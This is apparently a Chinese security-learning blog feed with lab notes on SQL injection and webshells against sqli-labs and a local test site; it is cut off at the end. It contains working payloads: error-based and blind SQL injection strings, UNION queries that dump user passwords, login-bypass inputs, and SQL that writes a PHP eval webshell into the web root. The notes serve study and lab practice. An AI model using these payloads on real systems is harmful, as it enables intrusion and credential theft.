中字母 <code>i</code> 两边加上 <code>$</code> ，然后点击 <code>Payloads</code>，在 <code>Payload type</code> 选择 <code>Brute forcer</code>，<code>Min length</code> 选择 <code>1</code>，<code>Max length</code> 选择 <code>1</code>。</p><p><img src="/images/136.png" alt></p><p>然后点击 <code>Start attack</code></p><p><img src="/images/137.png" alt></p><p><img src="/images/138.png" alt></p><p>继续改变位置可查出库名，同理表名，字段名也可以查出。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注总结，目标站点是 &lt;code&gt;sqli-labs&lt;/code&gt; 中的 &lt;code&gt;Less-8&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL盲注" scheme="http://yoursite.com/tags/SQL%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>note33</title>
    <link href="http://yoursite.com/2019/08/28/note33/"/>
    <id>http://yoursite.com/2019/08/28/note33/</id>
    <published>2019-08-28T11:37:48.000Z</published>
    <updated>2019-08-29T01:05:38.588Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注</p><a id="more"></a><!--export--><!--toc--><h3 id="URL-注释"><a href="#URL-注释" class="headerlink" title="URL 注释"></a><code>URL</code> 注释</h3><ol><li><code>-- |</code> 空格后面可以跟上任何字符</li><li><code>--+</code> <code>URL</code> 中会把 <code>+</code> 解析为空格</li><li><code>#</code> 识别为锚点</li></ol><p><code>GET</code> 参数会被 <code>url</code> 编码，但 <code>POST</code> 参数不会被 <code>url</code> 编码，请求头也不会编码。</p><p>整型 <code>id=26-1</code>可以用，但 <code>id=3+9</code> 却不能用，因为 <code>+</code> 解析为空格。</p><table><thead><tr><th align="center">符号</th><th align="center"><code>url</code> 编码</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">%20</td></tr><tr><td align="center">‘</td><td align="center">%27</td></tr><tr><td align="center">#</td><td align="center">%23</td></tr><tr><td align="center">“</td><td align="center">%22</td></tr><tr><td align="center">%</td><td align="center">%25</td></tr><tr><td align="center">&amp;</td><td align="center">%26</td></tr><tr><td align="center">/</td><td align="center">%2F</td></tr></tbody></table><h3 id="十种-MySQL-报错注入"><a href="#十种-MySQL-报错注入" class="headerlink" title="十种 MySQL 报错注入"></a>十种 <code>MySQL</code> 报错注入</h3><ol><li><code>floor()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错注入准确地说应该是 <code>floor</code>，<code>count</code>，<code>group by</code> 冲突报错。特定情况下，三个函数在一起使用会产生错误。</p><p>经典的 <code>floor</code> 注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p>首先看 <code>floor()</code> 报错产生条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat(database(), floor(rand(0)*2))x from security.users group by x</span><br></pre></td></tr></table></figure><p>语句中 <code>x</code> 是给 <code>floor(rand(0)*2)</code>添加一个别名，执行该语句得到： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!#1062 - Duplicate entry &apos;security1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错原理分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as x from information_schema_tables groupby a;</span><br></pre></td></tr></table></figure><p>重点在 <code>group by a</code> ，即 <code>group by floor(rand(0)*2)</code>。首先，<code>floor(rand(0)*2)</code> 意思是随机产生 0 或 1。虽说是随机的，但有规律可循，基本上是 <code>011011</code>这个序列。</p><p>为什么报错？</p><p>首先，系统会建立一个虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>假设有表：</p><table><thead><tr><th align="center">id</th><th align="center">name</th><th align="center">age</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">11</td><td align="center">18</td></tr><tr><td align="center">2</td><td align="center">22</td><td align="center">19</td></tr><tr><td align="center">3</td><td align="center">33</td><td align="center">20</td></tr><tr><td align="center">4</td><td align="center">44</td><td align="center">20</td></tr><tr><td align="center">5</td><td align="center">55</td><td align="center">18</td></tr></tbody></table><p>执行 <code>count(*) from ... group by age</code> 的过程中，会形成这样的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>那么这个表是如何形成的？由于 <code>group by</code> 的是 <code>age</code>，第一次读取的是 18 ，在虚拟表中寻找是否已经存在 18 ，由于表是空的，直接插入一条新数据，这时虚拟表变成这样：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>下一个时 19 ，由于虚拟表中依旧没有 key 为 19 的字段，故插入。再插入 20 ，和 19 的情况一样，当继续插入 第二个 20 时，由于已经有了 20 ，故将 key 为 20 的字段的 count(*) 的值加 1，依次类推，形成最后的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>如何将 <code>group by</code> 与 <code>floor</code> 联合起来，进行 <code>floor</code> 报错？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure><p><code>group by</code> 的是 <code>floor(rand(0)*2)</code> 每次运算的值都是随机的，首先，建立一张虚拟表，</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>接着，进行 <code>group by floor(rand(0)*2)</code> 。floor 表达式第一次运算的值为 0 ，在表中没有找到 key 为 0 的数据，故插入，在插入过程中需要再取一次  group by 后面的值，即在执行一次 floor 运算，结果为 1，取到了 1 ，插入数据，并将 count() 置 1.</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>再进行 group by floor(rand(0)2)，表为</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>执行到第四次 floor 运算时，这次值为 0 ，表中没有找到 key 为 0 的数据，故应当插入一条新数据，插入时，进行 floor 运算，这时值为 1，将 count(*) 置 1 。但虚拟表中已经有了 key 为 1数据，故此时会抛出主键冗余的异常，这就是所谓的 floor 报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><ol start="2"><li><code>extractvalue()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure><ol start="3"><li><code>updatexml()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure><ol start="4"><li><code>geometrycollection()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="5"><li><code>multipoint()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="6"><li><code>polygon()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="7"><li><code>multipolygon()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="8"><li><code>linestring()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="9"><li><code>exp()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><ol start="10"><li><code>multilinestring()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><p>其中，对于 <code>mariadb</code> ，方法 <code>1-3</code> 适用，<code>mysql 8.0</code>  方法 <code>2-3</code> 可用，<code>mysql 5.0</code> 方法 <code>1-9</code> 适用。</p><h3 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h3><p>盲注流程：</p><ol><li>先判断总数</li><li>判断单个长度</li><li>逐个字符判断名称，二分法</li></ol><p>常用函数</p><table><thead><tr><th align="center">函数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">ascii(‘A’)</td><td align="center">查看 ASCII 码</td></tr><tr><td align="center">char(100)</td><td align="center">通过 ASCII 码，查看字符</td></tr><tr><td align="center">substr/mid(str, start,length)</td><td align="center">截取字符</td></tr><tr><td align="center">length(string)</td><td align="center">计算字符串长度</td></tr><tr><td align="center">count( )</td><td align="center">统计个数</td></tr></tbody></table><p>常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and select group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名长度</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select group_concat(schema_name) from information_schema.schemata)) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 判断各个字符 ASCII</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select group_concat(schema_name) from information_schema.schemata), 1, 1)) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos;and (select count(distinct schema_name) from information_schema.schemata) &gt; 3 ——+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and mid((select distinct schema_name from information_schema.schemata limit 0,1), 1, 1) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前数据中有几张表</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and (select count(table_name) from information_schema.tables where table_schema = database()) &gt; 1 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看一张表的名字</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select table_name from information_schema.tables where table_schema = database() limit 0,1), 1, 1)) &gt; 100 --+</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>练习9</title>
    <link href="http://yoursite.com/2019/08/27/practice9/"/>
    <id>http://yoursite.com/2019/08/27/practice9/</id>
    <published>2019-08-27T12:22:54.000Z</published>
    <updated>2019-08-27T13:00:34.857Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对新闻管理系统进行 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="UNION-SELECT-注入"><a href="#UNION-SELECT-注入" class="headerlink" title="UNION SELECT 注入"></a>UNION SELECT 注入</h3><p><a href="http://192.168.100.166/display.php" target="_blank" rel="noopener">测试网址</a></p><h4 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h4><p>首先进入到一个电影介绍页面，网址上有 <code>id</code> 可能存在 SQL 注入</p><p>先在 把<code>id=3</code>改成 <code>id=3-1</code> 发现内容改变了，故可得为整型，若为字符型则内容不变。 </p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>因为整型注入故直接在后面加上<code>order by</code> 即可，发现字段数为 3</p><p><img src="/images/110.png" alt></p><p>然后先用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,2,3</span><br></pre></td></tr></table></figure><p>判断各字段输出的位置，然后再正式开始 SQL 注入</p><h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><h5 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA),3</span><br></pre></td></tr></table></figure><p><img src="/images/111.png" alt></p><p>可以看书我们所需要查看的表名是 <code>mynews</code></p><h5 id="查看-mynews-库中的表名"><a href="#查看-mynews-库中的表名" class="headerlink" title="查看 mynews 库中的表名"></a>查看 <code>mynews</code> 库中的表名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),3</span><br></pre></td></tr></table></figure><p><img src="/images/112.png" alt></p><h5 id="查看-tb-users-表中的列名"><a href="#查看-tb-users-表中的列名" class="headerlink" title="查看 tb_users 表中的列名"></a>查看 <code>tb_users</code> 表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&apos;tb_users&apos;,3</span><br></pre></td></tr></table></figure><p><img src="/images/113.png" alt></p><h5 id="查看-username-和-password-字段的数据"><a href="#查看-username-和-password-字段的数据" class="headerlink" title="查看 username 和 password 字段的数据"></a>查看 <code>username</code> 和 <code>password</code> 字段的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(username, &apos;-&apos;, password) FROM `db_mynews`.`tb_users`),3</span><br></pre></td></tr></table></figure><p><img src="/images/114.png" alt></p><h4 id="排序功能注入"><a href="#排序功能注入" class="headerlink" title="排序功能注入"></a>排序功能注入</h4><p>分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE title like &apos;%1%&apos; or content like &apos;%1%&apos; or author like &apos;%1%&apos; order by &apos;%1%&apos;</span><br></pre></td></tr></table></figure><p>首先要判断查询时，哪个字段在前面，否则会影响后面注入过程。</p><p>排序界面有三列，分别为标题，内容和作者。所以我们要从这三个方向入手。经过简单的试错，我们可以判断出来标题在最前面。</p><p>然后再搜索框输入 <code>好%&#39; ORDER BY 3</code> 显示正常，然后再修改为 <code>好%&#39; UNION SELECT 1,2,3#</code></p><p><img src="/images/115.png" alt></p><p>把第二个位置换成 <code>user()</code></p><p><img src="/images/116.png" alt></p><p>然后就可以继续进行其他信息的查询了，和前面一样，这里不再重复。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 对新闻管理系统进行 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>note32</title>
    <link href="http://yoursite.com/2019/08/27/note32/"/>
    <id>http://yoursite.com/2019/08/27/note32/</id>
    <published>2019-08-27T11:15:58.000Z</published>
    <updated>2019-08-27T12:21:05.441Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 万能密码，SQL 注入的分类以及简单的 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>搭建好环境后，关机快照，虚拟机不要留下任何关于自己的信息，禁止虚拟机和物理机的连接，虚拟机的主机名随意取，每做完一次渗透后，恢复到初始化快照。</p><p>重视：主机名+时间+电量+剪切板</p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; AND `password`= &apos;password&apos;</span><br></pre></td></tr></table></figure><p>当用户输入 <code>admin&#39; or 1 #</code> 时，带入上面的语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#多行结果，需要碰运气，在验证密码时，有一个用户密码是我们输入的密码</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#一行结果，admin的没用，因为不知道admin密码，验证密码会失败</span><br></pre></td></tr></table></figure><p>可以明显看到后面的有关查询密码的句子被注释掉了，前面是个永真条件。即这条 SQL 语句查询的是所有用户名，登录之后只显示一条数据，有可能是第一条也有可能是其他，具体看程序如何解析。</p><p>要想只输出一条语句可以用下面语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1. 直接把后面全部注释掉   admin&apos; #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#2. 把or换成and      admin&apos; and 1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#3. 加入limit限制        admin&apos; or 1 limit 0,1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br></pre></td></tr></table></figure><p>做用户登录功能时，有两种实现思路，一种是像上面这样直接用用户名和密码查询，另一种是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos;;</span><br></pre></td></tr></table></figure><p>然后再用 <code>if(查询出来的密码和输入的密码是否相等)</code> 来判断，实现方法不同，具体的注入手段也不同，应具体问题具体分析。</p><h4 id="SQL-注入原理介绍"><a href="#SQL-注入原理介绍" class="headerlink" title="SQL 注入原理介绍"></a>SQL 注入原理介绍</h4><p>当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取和修改数据库中的数据。</p><p><strong>SQL 注入漏洞本质</strong>：把用户输入的数据当做代码来执行，违背了 “<strong>数据与代码分离</strong>“的原则。</p><p><strong>SQL 注入漏洞两个关键条件</strong>：</p><ul><li>用户能控制输入的内容</li><li>Web 应用把用户输入的内容带入到数据库中执行</li></ul><h4 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h4><p><strong>根据请求不同可以分为</strong>：</p><ul><li>GET 请求方式注入</li><li>POST 请求方式注入</li><li>请求头</li></ul><p><strong>根据 SQL 注入点的类型参数分为</strong>：</p><ul><li>整型注入</li><li>字符型注入</li></ul><p><strong>只要有数据提交到数据库中的地方就可能存在注入点</strong></p><p>如何区整数型字和字符型</p><ol><li><p>数字-1      判断字符型和数字型</p><p>结果不变   →     不是数字型</p></li><li><p>右边加 ‘ 无数据 无 SQL 错误   →   不一定有注入</p></li><li><p>右边加 ‘ # 有数据 →  有注入</p></li></ol><p><strong>根据 SQL 注入点的反馈类型可分为</strong>：</p><ul><li>基于错误显示的 SQL 注入</li><li>UNION 类型的 SQL 注入</li><li>布尔类型的 SQL 注入</li><li>基于时间的 SQL 注入</li><li>多语句</li><li>内联</li></ul><p><strong>根据 Web 应用常用的数据库类型分类</strong>：</p><ul><li><p>MySQL 数据库注入</p></li><li><p>SQLServer 数据库注入</p></li><li><p>Oracle 数据库注入</p></li><li><p>Access数据库注入</p></li><li><p>MongoDB 数据库注入</p></li></ul><p><strong>注入方法分类</strong>：</p><ul><li>直接页面看到数据<ul><li>UNION SELECT</li><li>报错</li></ul></li><li>一个一个字母判断值<ul><li>布尔盲注</li><li>时间延时注入</li><li>内联</li></ul></li><li>多语句</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 万能密码，SQL 注入的分类以及简单的 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>note31</title>
    <link href="http://yoursite.com/2019/08/27/note31/"/>
    <id>http://yoursite.com/2019/08/27/note31/</id>
    <published>2019-08-27T11:15:53.000Z</published>
    <updated>2019-08-27T15:28:29.671Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。</p><a id="more"></a><!--export--><!--toc--><h3 id="学习目的"><a href="#学习目的" class="headerlink" title="学习目的"></a>学习目的</h3><ul><li>熟悉 PHP 命令执行的函数</li><li>理解什么是 webshell</li><li>能够写出一句话木马</li><li>能够利用大马</li><li>熟练中国菜刀的使用</li><li>理解 webshell 的变形</li></ul><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>Phpmyadmin</p><p>​    getshell 一般情况下，两种操作方式</p><p>SQL 语句 into outfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;123&quot; INTO DUMPFILE &quot;绝对路径&quot;; # 直接写文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&quot; INTO DUMPFILE &quot;C:/phpStudy/PHPTutorial/www/a.php&quot;;</span><br></pre></td></tr></table></figure><p><code>--secure-file-priv option</code></p><p>源代码拷贝到网站根目录中，之后修改权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R apache: apache /var/www/html</span><br></pre></td></tr></table></figure><p>一定要弄清楚权限</p><p>php 代码    apache用户</p><p>数据库操作 SQL 语句       mysql 用户</p><p>mysql 日志写 webshell</p><p>mysql 每执行一个 sql 语句，就会把 sql 语句写入到文件日志中，但默认情况下，这个选项是关闭的，因此需要去开启这个选项，再设置日志路径，日志路径设置为网站目录，日志文件名字为 .php 结尾的文件</p><p>general log   OFF -&gt; ON   打开日志功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW MASTER LOGS;</span><br><span class="line">SET GLOBAL general_log = &apos;ON&apos;</span><br><span class="line">SET GLOBAL general_log_file = &apos;C:/phpStudy/PHPTutorial/WWW/404.php&apos;</span><br></pre></td></tr></table></figure><p>执行任意 sql 语句，就能把内容存到 .php 结尾的文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&quot;</span><br></pre></td></tr></table></figure><p>除了 <code>&lt;?php ?&gt;</code> 其他均解析为 html</p><p>php 的短标签：</p><ul><li><? php ?></li><li><p>&lt;% %&gt;</p></li><li><? ?></li><li><script language="php"> </script></li></ul><h3 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h3><h4 id="执行-PHP-代码："><a href="#执行-PHP-代码：" class="headerlink" title="执行 PHP 代码："></a>执行 PHP 代码：</h4><p>​    eval(), assert()</p><h4 id="执行系统命令："><a href="#执行系统命令：" class="headerlink" title="执行系统命令："></a>执行系统命令：</h4><pre><code>* system() 输出并返回最后一行 shell 结果* exec() 不输出结果，返回最后一行 shell 结果，所有结果可以保存一个返回的数组里面* passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上* popen()* shell_exec()* proc_open()* pcntl_exec()</code></pre><p>反引号 ` 这个实际上使用的是 shell_exec</p><h4 id="exec-函数"><a href="#exec-函数" class="headerlink" title="exec()函数"></a>exec()函数</h4><p>exec函数，执行外部程序，不直接显示输出，只显示最后一行结果，一般把结果输出到数组中保存。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"ipconfig"</span>, $output);l</span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="number">1</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>执行外部程序，不直接显示输出，与 shell_exec() 函数等同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 